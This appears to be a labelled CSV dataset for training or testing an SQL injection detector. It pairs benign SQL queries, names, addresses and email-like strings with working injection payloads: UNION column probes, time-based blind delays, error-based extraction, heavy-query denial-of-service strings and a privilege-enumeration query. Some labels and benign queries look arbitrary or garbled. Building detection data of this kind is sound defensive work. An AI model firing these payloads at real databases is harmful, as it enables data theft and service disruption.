Query,Label
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- cbsd",1
"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",1
-2456'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'bbkp'  =  'bbkp,1
"  SELECT * FROM fallen WHERE whistle IN  ( 'strip', 'herself', 'direction' )  ",0
-6855'  )   or 8519  =  9248,1
-8836%'  )   or 4856  =  3891,1
1s,1
"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",1
SELECT * FROM but,0
if  (  5127  =  2829  )   select 5127 else drop function okos--,1
"   SELECT unless, applied, expressFROM know WHERE slow  IS NOT NULL",0
"ruiz de alda, 78",0
44923287d,0
1 union all select null--,1
SELECT * FROM  ( SELECT say FROM fire ) ,0
basilisa,0
"c/ fray diego de cadiz, 50",0
SELECT TOP 50 PERCENT * FROM across,0
-6637'   )    )    order by 1#,1
"1"" where 8732  =  8732",1
san bartolom,0
"carrer nostra sra del pilar, 101",0
-9143  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
canciano,0
-5555   )    )    as ldte where 4583  =  4583 order by 1#,1
"jose gomez gallito, 107,",0
"1"" where 2483  =  2483",1
"1'  )   union all select null,null,null--",1
"INSERT INTO naturally ( stretch, foreign, found, beside, experience, push )  VALUES  ( 'saw', 'finest'. globe', 'older', 'former', 'record', 'boy' )  ",0
SELECT * FROM furniture ORDER BY improve DESC,0
SELECT * FROM day WHERE out = 'function',0
"INSERT INTO come  ( rabbit, separate, full )  VALUES  ( 'government', 'using', 'hard' )  ",0
1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,1
SELECT * FROM being 3 SELECT * FROM closer,0
"1'  )   as kbja where 4275  =  4275 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
3.45448E+15,0
SELECT inch ( s FROM tool RIGHT JOIN,0
SELECT * FROM upward WHERE each NOT LIKE 'moving%',0
"-3460%""   )    )     )   or 9323  =  9323#",1
"1  )   and elt  (  4249  =  4249,7259  )  ",1
"1"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT AVG ( attack ) FROM over,0
" SELECT * FROM fourth ORDER BY dust ASC, talk DESC",0
"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"   SELECT COUNT ( reach ) , oldest FROM rich BY curve",0
SELECT * FROM appropriate WHERE needed = 'satellites' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM dollar WHERE political BETWEEN '1996-07-01' AND '1996-07-31',0
"1""  )   union all select null,null,null,null,null,null,null,null#",1
"-4929"" where 6381  =  6381 or 8571  =  8571--",1
cerpa oitavn,0
"1%"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """,1
marcanti,0
SELECT * FROM day WHERE    NOT practice = 'depth',0
"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",1
chlud_kumvongse@encuentrodominios.sd,0
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,1
SELECT Count ( * )  AS exactly,0
esser,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'vwxg'  =  'vwxg",1
"-9405'  )   union all select 8283,8283,8283,8283--",1
SELECT Count ( * )  AS kill,0
ayate,0
bravat-a,0
jasmann,0
SELECT TOP 3 * FROM round,0
"  SELECT * FROM go WHERE mental IN  ( 'writer', 'me', 'fellow' )  ",0
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",1
1'   )    )    as fbjd where 8597  =  8597,1
"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
SELECT one FROM writer UNION ALL SELECT pony FROM central ORDER BY plate,0
1   )    )    as rvex where 3462  =  3462 and 4595  =  4595#,1
SELECT * FROM mountain WHERE block BETWEEN modern09/01/1996dollar AND come15/31/1996love,0
17130,0
SELECT Count ( * )  AS cause,0
"-1485'   )    )     )   union all select 7661,7661,7661,7661,7661--",1
8230,0
caridad,0
san miguel del pino,0
bnrinfo,0
"1""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT cat ( s ) FROM sudden INNER JOIN,0
nadav6,0
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1
SELECT COUNT ( wild )  FROM made,0
1oca,0
SELECT * FROM opinion ORDER BY forgot,0
1'   )    )    as yyud where 4934  =  4934,1
valido casademont,0
SELECT DISTINCT art FROM if,0
"  SELECT * FROM missing WHERE fairly NOT IN  ( 'father', 'industry', 'travel' )  ",0
SELECT * FROM rather 3 SELECT * FROM prove,0
"paso de la soledad, 130 10?f",0
des7768ab9e6os,0
SELECT * FROM specific WHERE story = 'tax'  AND City = 'expect',0
waitfor delay '0:0:5' and '%'  =  ',1
SELECT MIN ( not )  AS compound FROM bar,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 292420 )  ORDER BY meta_id ASC",0
vilar elsegui,0
cagarria,0
62258107m,0
argeo,0
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- icxn,1
"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
"1""   )    )    as tgwp where 9405  =  9405",1
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'qvrd'  =  'qvrd",1
FROM  ( SELECT DISTINCT century FROM supply ) ,0
SELECT Count ( * )  AS stepped,0
56876281h,0
"1'||  (  select 'ativ' from dual where 4746  =  4746 union all select null,null,null,null#",1
SELECT TOP 3 * FROM actual SELECT * FROM moving 3SELECT * FROM plate,0
-7111' or   (  8459  =  8459  )  *4906,1
SELECT MIN ( hung )  AS shaking FROM breakfast,0
SELECT COUNT ( something ) FROM driving,0
brenda,0
SELECT AVG ( Price ) FROM skill,0
"-8612'+  (  select 'iqla' where 5035  =  5035 union all select 5035,5035,5035,5035,5035,5035,5035#",1
d75a4r45der,0
basilia,0
1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
50159319e,0
"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  # tcrm",1
cella,0
6i4t562e7a,0
15873,0
"-8109%""   )    )    union all select 9089,9089--",1
select * from users where id  =  1. or 1  =  1 -- 1,1
1'||  (  select 'vvpn' from dual where 7011  =  7011 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',1
SELECT * FROM social WHERE run BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM complex WHERE NOT nervous = 'slept'  AND NOT real = 'pie',0
1  )   where 9344  =  9344,1
SELECT fort ( s )  FROM main LEFT JOIN,0
SELECT * FROM clear 3,0
"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""rphs""  =  ""rphs",1
"   SELECT COUNT ( especially ) , crew FROM soldier BY height",0
" SELECT * FROM tales ORDER BY how ASC, break DESC",0
FROM  ( SELECT DISTINCT twice FROM larger ) ,0
t45o0a35,0
20100,0
1  )   where 1090  =  1090 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
-2604   )    )    as sekb where 6897  =  6897 or 1000  =  7683,1
SELECT COUNT ( angry ) FROM everywhere,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8774 )  ORDER BY meta_id ASC",0
SELECT * FROM one  WHERE threw = step,0
incisivo,0
"1' where 9994  =  9994 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT TOP 50 PERCENT * FROM disease,0
"  SELECT typical,look,shells FROM below LEFT JOIN Orders ON border.moodID =  accurate.although ORDER BY studying.purpose",0
SELECT cross ( s FROM nation RIGHT JOIN,0
select   (  case when   (  4636  =  1108  )   then 1 else 4636*  (  select 4636 from master..sysdatabases  )   end  )  --,1
5672,0
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'vnfi'  =  'vnfi,1
SELECT AVG ( oldest ) FROM disappear SELECT SUM ( plates ) ,0
"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1
SELECT * FROM cast  WHERE test = mood,0
gupton,0
"paseo pinos, 147",0
belia,0
SELECT * FROM officer WHERE cutting = 'involved' LIMIT 3,0
SELECT COUNT ( DISTINCT visit )  FROM prove,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  8535  =  8535",1
1'+  (  select 'fqkk' where 9725  =  9725,1
10702,0
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
"  SELECT * FROM doctor WHERE adventure IN  ( 'stuck', 'pull', 'title' )  ",0
select case when 3661  =  9315 then 1 else null end--,1
SELECT * FROM children 3 SELECT * FROM desert,0
"  SELECT splitID AS ID, shorter AS he FROM list",0
"-3794'  )   union all select 2485,2485,2485,2485,2485--",1
"  UPDATE location SET couple =  'line', City =  'key' WHERE belt =  village",0
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT brave FROM tongue UNION ALL SELECT ought FROM business ORDER BY specific,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",1
SELECT * FROM scared FETCH FIRST 50 PERCENT ROWS ONLY,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",1
yasna,0
"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
SELECT * FROM sky WHERE such NOT LIKE 'pitch%',0
"-2168""   )    )    union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",1
SELECT * FROM adjective WHERE largest = 'vowel' LIMIT 3,0
"1""  )   where 2834  =  2834   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
gaetano,0
waitfor delay '0:0:5' and    (    (     (  8981  =  8981,1
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1
SELECT * FROM chain WHERE education = 'continued' LIMIT 3,0
1' where 3337  =  3337 and 8403  =  5760,1
vilalba sasserra,0
SELECT AVG ( twice ) FROM fair,0
"  SELECT * FROM independent WHERE forty NOT IN  ( 'rays', 'bone', 'swung' )  ",0
"-7887'  )   union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",1
nab,0
SELECT * FROM wooden WHERE grandmother NOT LIKE 'tonight%',0
 UPDATE rocky SET swim = 'doll'WHERE vegetable = 'frame',0
SELECT everybody ( s )  FROM spell FULL OUTER JOIN,0
SELECT COUNT ( spent )  FROM cut,0
select sleep  (  5  )   and   (  4863  =  4863,1
"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv",1
SELECT * FROM twelve WHERE example = 'use'  AND City = 'unless',0
1   )    )    as rbcf where 1053  =  1053,1
sinesio,0
"1%""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,1
SELECT Count ( * )  AS blank,0
0e06u8s17,0
" select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",1
"1""   )    )    and 5421  =  4804--",1
"1""   )    )     )   union all select null,null#",1
"1%""   )    )    and   (  7817  =  4371  )  *4371 and    (    (   ""%""  =  """,1
"-5300' union all select 2750,2750,2750,2750,2750,2750--",1
cremades@baltasarsantos.kn,0
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk",1
"1""  )   where 3445  =  3445 and elt  (  1212  =  1254,1254  )  --",1
"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ygzq"" like ""ygzq",1
1.22869E+15,0
"  SELECT appleID AS ID, symbol AS ride FROM stood",0
grant connect to name; grant resource to name;,1
"-6200' where 9150  =  9150 union all select 9150,9150,9150,9150,9150,9150,9150#",1
"1""  )   where 9285  =  9285 and 8506  =  8343#",1
rudie@deuxmanagement.jo,0
UNION ALL SELECT,1
SELECT * FROM us 3,0
5632,0
sedran,0
7395,0
"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
velov@expozaragozafloral2014.ac,0
277,0
FROM  ( SELECT DISTINCT return FROM call ) ,0
DELETE FROM because WHERE deeply = 'quickly',0
" SELECT * FROM he ORDER BY usually ASC, rapidly DESC",0
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  # jpau",1
SELECT DISTINCT typical FROM discover,0
1.65E+15,0
1'  )   where 8086  =  8086 and 1430  =  7941--,1
"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
"-2032%""   )    )     )   or   (  3082  =  7155  )  *7155 and    (    (     (  ""%""  =  """,1
replace,1
SELECT * FROM keep 3,0
SELECT yourself FROM fair,0
"  SELECT PERIOD_DIFF ( 1703, 1612 ) ;",0
SELECT wherever ( s ) FROM degree INNER JOIN,0
SELECT AVG ( nine )  FROM actually  SELECT SUM ( writer ) ,0
SELECT TOP 3 * FROM instant,0
"   SELECT Employees.warm, COUNT ( Orders.twoID )  AS diagramFROM    ( OrdersINNER JOIN shadow ON Orders.pondID  =  Employees.norID ) ",0
SELECT * FROM general 3,0
"calle ponte vella s/n, 13e",0
trevetha,0
SELECT * FROM  ( SELECT fresh FROM left ) ,0
SELECT ready ( s )  FROM tight LEFT JOIN,0
niembro urkiaga,0
"1%""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1  )   union all select null,null,null,null,null,null--",1
decidir,0
91650654r,0
SELECT * FROM model WHERE    NOT mail = 'exactly',0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",1
marcano giner,0
"  SELECT * FROM snow WHERE lake NOT IN  ( 'easily', 'success', 'cave' )  ",0
-2648'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'sawt'  =  'sawt,1
SELECT * FROM basket WHERE kind NOT BETWEEN 'contrast' AND 'silly',0
"1%' union all select null,null,null,null,null,null,null,null,null,null--",1
"1' where 5023  =  5023 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"CREATE TABLE IF NOT EXISTS `zcf_submitlogs`  (  `id` int ( 6 )  unsigned NOT NULL AUTO_INCREMENT, `crmsubmitlogStatus` varchar ( 20 )  DEFAULT NULL, `crmsubmitlogDescribtion` longtext NOT NULL, `crmsubmitFormType` varchar ( 30 )  NOT NULL, PRIMARY KEY  (  id  )   )  ENGINE = InnoDB DEFAULT CHARSET = utf8",0
SELECT AVG ( darkness ) FROM women,0
1 where 9404  =  9404,1
v,1
SELECT * FROM poem WHERE stage = 'happen' LIMIT 3,0
SELECT * FROM seven ORDER BY swung,0
werkmeister@19horas.zr,0
solonitsin3@neotelecom.fi,0
dulcera,0
"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'ydxb'  =  'ydxb",1
